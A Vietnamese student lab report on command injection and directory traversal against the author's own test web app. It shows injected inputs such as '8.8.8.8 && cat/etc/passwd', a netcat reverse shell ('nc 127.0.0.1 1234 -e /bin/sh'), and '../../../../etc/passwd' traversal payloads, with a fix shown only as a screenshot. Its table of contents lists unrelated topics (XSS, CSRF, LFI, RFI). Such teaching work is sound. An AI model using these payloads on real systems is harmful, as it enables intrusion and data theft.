# <div align="center"><p> Command Injection, Directory Traversal Vuln, XML external entity injection </p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 17/5/2022
 ### MỤC LỤC
 1. [Command Injection](#1)
 
     1.1 [Khái niệm XSS](#11)
      
     1.2 [Các kiểu khai thác XSS](#12)
 
     1.3 [Khi nào thì XSS sẽ xảy ra](#13)

     1.4 [Cách khắc phục XSS](#14)
      
     1.5 [Cách sử dụng XSS để đánh cắp cookies người dùng](#15)
 
     1.6 [Điều chỉnh các tham số header](#16)

     1.7 [Mô phỏng XSS đánh cắp phiên khi Login vào trang web. Cookie sẽ được điều hướng về 1 host dựng sẵn](#17)
      
     1.8 [Mô phỏng code XSS](#18)
 
     1.9 [Khắc phục code lỗi XSS](#19)
     
 2. [CSRF](#2) 

     2.1 [Khái niệm CSRF](#21)
      
     2.2 [Cách thức tấn công CSRF](#22)
 
     2.3 [Mô phỏng code lỗi CSRF](#23)

     2.4 [Khắc phục code lỗi CSRF](#24)
       
 3. [LFI](#3)

     3.1 [Khái niệm LFI](#31)
      
     3.2 [Cách thức tấn công LFI](#32)
 
     3.3 [Mô phỏng code lỗi LFI](#33)

     3.4 [Khắc phục code lỗi LFI](#34)

  4. [RFI](#4)

     4.1 [Khái niệm RFI](#41)
      
     4.2 [Cách thức tấn công RFI](#42)
 
     4.3 [Mô phỏng code lỗi RFI](#43)

     4.4 [Khắc phục code lỗi RFI](#44)
 
 5. [Các hàm đã sử dụng](#5)
 
### Nội dung báo cáo 
#### 1. Command Injection <a name="1"></a>
<br> 1.1 Khái niệm Command Injection <a name="11"></a></br>
 - Command Injection là đưa các lệnh của hệ điều hành được thực thi thông qua một ứng dụng web. 
  
 <br> 1.2 Sự khác nhau giữa code injection và command injection <a name="11"></a></br>
  <table align="center">
   <tr>
        <td align="center" ><b>Tên</b></td>
        <td align="center"><b>Khác nhau</b></td>
   </tr>
   <tr>
        <td><b>code injection</b></td>
        <td><b>Cho phép hacker chèn mã riêng, sau đó được ứng dụng thực thi</b></td>
   </tr>
   <tr>
        <td ><b>command injection</b></td>
        <td ><b>Cho phép mở rộng chức năng mặc định của ứng dụng, thực thi các lệnh hệ thống mà không cần phải chèn mã.</b></td> 
   </tr>
 </table>
 
 <br> 1.3 Một số lệnh để lấy thông tin <a name="11"></a></br>
  - Để kiểm tra ứng dụng có lỗ hổng chèn lệnh hay không thì sử dụng siêu ký tự cho phép các lệnh được xâu chuỗi lại với nhau. Các dấu phân tách lệnh sau hoạt động trên cả hệ thống dựa trên Windows và Unix: &, &&, ||, |, ;, ', #,...
  <table align="center">
   <tr>
        <td align="center" ><b>Windows</b></td>
        <td align="center"><b>Linux</b></td>
         <td align="center"><b>Chức năng</b></td>
   </tr>
   <tr>
        <td ><b>whoami</b></td>
        <td ><b>whoami</b></td> 
        <td ><b>Tên của người dùng hiện tại</b></td>
   </tr>
   <tr>
        <td ><b>	ver</b></td>
        <td ><b>	uname -a</b></td> 
        <td ><b>Hệ điều hành</b></td>
   </tr>
   <tr>
        <td ><b>	ipconfig/all</b></td>
        <td ><b>ifconfig</b></td>
        <td ><b>	Cấu hình mạng</b></td>
   </tr>
   <tr>
        <td ><b>	netstat-an</b></td>
        <td ><b>	netstat-an</b></td>
        <td ><b>	Kết nối mạng</b></td>
   </tr>
   <tr>
        <td ><b>	tasklist /all</b></td>
        <td ><b>	ps-ef</b></td>
        <td ><b>	Các quy trình đang chạy</b></td>
   </tr>
 </table>
 
  - Ngoài ra, trên linux còn có thể sử dụng các lệnh sau để kiểm tra ứng dụng:
    - `php -v`: Cung cấp cho bạn phiên bản PHP chạy trên máy chủ ứng dụng web.
    - `/etc/passwd`: Hiển thị tất cả người dùng trên Máy chủ Linux phụ trợ
    - `/etc/shadow: Hiển thị tất cả mật khẩu đã băm nhưng chỉ khi bạn đang chạy với đặc quyền root.
    
<br> 1.4 Mô phỏng code command injection <a name="11"></a></br>
 - Đây là code lỗ hổng:

   ![image](https://user-images.githubusercontent.com/101852647/168734352-b4d9b93b-ac4b-4b7f-9c3a-1b269a6fcfc3.png)

<br> 1.5 Khai thác lỗ hổng và thực thi reverse shell <a name="11"></a></br>
 - Đây là giao diện web chứa lỗ hổng command injetion:

   ![image](https://user-images.githubusercontent.com/101852647/168750779-77522d7c-4aa3-4ab5-b154-98b85a743f7a.png)
   
 - Bây giờ thử `ping 8.8.8.8` để kiểm tra kết nối:

   ![image](https://user-images.githubusercontent.com/101852647/168751764-78be9087-11ca-4a9e-9a03-148eeff242cb.png)

 - Tiếp theo chúng ta kiểm tra lỗ hổng bằng cách thử nhập `8.8.8.8 && ls` và nó đã hiển thử thư mục cho chúng ta:

   ![image](https://user-images.githubusercontent.com/101852647/168752189-dbcf99eb-2c07-4063-a866-22829a22ae80.png)

 - Chúng ta cũng có thể kiểm tra tên người dùng hiện tại bằng lệnh `8.8.8.8 && whoami`:

   ![image](https://user-images.githubusercontent.com/101852647/168752606-54908571-199b-41c4-813f-66b892248bc1.png)

 - Hoặc chúng ta có thể hiển thị hệ điều hành bằng lệnh `8.8.8.8 && uname -a`:

   ![image](https://user-images.githubusercontent.com/101852647/168752979-70a354dd-80d9-4389-9b10-1743aa5d7c69.png)

 - Chúng ta cũng có thể xem nội dung trong tệp `/etc/passwd` bằng lệnh ` 8.8.8.8 && cat/etc/passwd`:

   ![image](https://user-images.githubusercontent.com/101852647/168753366-936ebc40-beb8-4eaa-9b11-6d12bd4276ca.png)

 - Bây giờ chúng ta sẽ thực hiện reverse shell. Đầu tiên chúng ta sử dụng lệnh ` nc -lvnp 1234` để mở trình lắng nghe cho các kết nối:

   ![image](https://user-images.githubusercontent.com/101852647/168758609-76e603b5-9150-46f2-bc77-8346ad1666f8.png)
   
 - Tiếp theo chúng ta sử dụng lệnh `netstat -tunpl `để kiểm tra các kết nối mạng  :

   ![image](https://user-images.githubusercontent.com/101852647/168759055-859aaa02-53b5-4553-b052-9fb47f4eb6ef.png)

 - Sau đó chúng ta sẽ kiểm tra địa chỉ ip :

   ![image](https://user-images.githubusercontent.com/101852647/168759247-b45d025b-826e-4359-8e70-d5915b3b9d22.png)

 - Bây giờ chúng ta sẽ thử lệnh `8.8.8.8 && nc 127.0.0.1 1234 -e /bin/sh ` để tạo một trình bao trên máy chủ và kết nối ngược lại với máy chúng ta:

   ![image](https://user-images.githubusercontent.com/101852647/168760822-0a14488c-0e86-4143-91b1-7f595d0b1681.png)

#### 2. Directory Traversal  <a name="1"></a>
<br> 2.1 Khái niệm <a name="11"></a></br>
 - Directory Traversal cho phép đọc các thư mục hoặc là các file không mong muốn trên server. Nó dẫn đến việc bị lộ thông tin nhạy cảm của ứng dụng như thông tin đăng nhập , một số file hoặc thư mục của hệ điều hành.
 - Một số tệp hệ thống có thể bị tấn công: 
<table align="center">
   <tr>
        <td align="center" ><b>Tên tệp</b></td>
        <td align="center"><b>Nội dung</b></td>
   </tr>
   <tr>
        <td ><b>/etc/passwd</b></td>
        <td ><b>Chứa thông tin về tất cả tài khoản của người dùng</b></td> 
   </tr>
   <tr>
        <td ><b>	/etc/group</b></td>
        <td ><b>	Chứa các nhóm mà người dùng</b></td> 
   </tr>
   <tr>
        <td ><b>	/etc/profile</b></td>
        <td ><b>Chứa các biến mặc định cho người dùng</b></td>
   </tr>
   <tr>
        <td ><b>	/etc/issue</b></td>
        <td ><b>	Chứa thông báo hiển thị trước khi đăng nhập</b></td>
   </tr>
   <tr>
        <td ><b>	/proc/version</b></td>
        <td ><b>	Chứa phiên bản Linux đang được sử dụng</b></td>
   </tr>
   <tr>
        <td ><b>	/proc/cpuinfo</b></td>
        <td ><b>	Chứa thông tin bộ xử lý</b></td>
   </tr>
 </table>
<br> 2.2 mô phỏng code lỗ hổng Directory Traversal <a name="11"></a></br>
 - Đây là code lỗi Directory Traversal:

   ![image](https://user-images.githubusercontent.com/101852647/168809005-4a602f4c-19a9-4c29-a826-64c5636079b0.png)

 - Đây là giao diện web:

   ![image](https://user-images.githubusercontent.com/101852647/168809150-6feb9f3d-2e45-4ec2-9471-53e361188fea.png)

<br> 2.3 Khai thác lỗ hổng Directory Traversal <a name="11"></a></br>
 - Đầu tiên chúng ta sẽ sử dụng lệnh `../../../../etc/passwd` để hiển thị thông tin về tất cả tài khoản của người dùng:

   ![image](https://user-images.githubusercontent.com/101852647/168804040-6e21b18f-2743-42b5-af2a-5bc6279ca37a.png)

 - Tiếp theo có thể sử dụng lệnh `../../../../etc/group` để hiển thị các nhóm mà người dùng:

   ![image](https://user-images.githubusercontent.com/101852647/168804301-08a5a764-180c-4829-9388-3ef0ab75e265.png)

 - Chúng ta sẽ sử dụng lệnh `../../../../etc/profile` để hiển thị các biến mặc định cho người dùng:

   ![image](https://user-images.githubusercontent.com/101852647/168804593-4587d409-190b-4c54-9ed0-0613650f8d51.png)

 - Chúng ta cũng có thể sử dụng lệnh `../../../../etc/issue` để hiển thị thông báo trước khi đăng nhập:

   ![image](https://user-images.githubusercontent.com/101852647/168804975-41a08850-afe4-49ac-b73f-4a59a4134f72.png)
   
 - Có thể sử dụng lệnh `../../../../proc/version` để hiển thị phiên bản của Linux đang được sử dụng:

   ![image](https://user-images.githubusercontent.com/101852647/168806098-63d80ae1-dfa7-4f96-adf0-c942d646bb87.png)

 - có thể sử dụng lệnh `../../../../proc / cpuinfo` để hiển thị thông tin bộ xử lý:

   ![image](https://user-images.githubusercontent.com/101852647/168806364-ac869f81-8fe0-49e1-964b-e7439e949ef1.png)
 
<br> 2.4 code khắc phục lỗ hổng Directory Traversal <a name="11"></a></br>
 - Đây là code khắc phục:

   ![image](https://user-images.githubusercontent.com/101852647/168808665-72713f29-7ff3-410d-9d43-73b4549b2b4a.png)

 - Bây giờ chúng ta thử đăng nhập lại lệnh `../../../../etc/passwd` thì không có kết quả trả về:

   ![image](https://user-images.githubusercontent.com/101852647/168807680-077aa818-3556-465f-a8ef-7615a6e9a637.png)
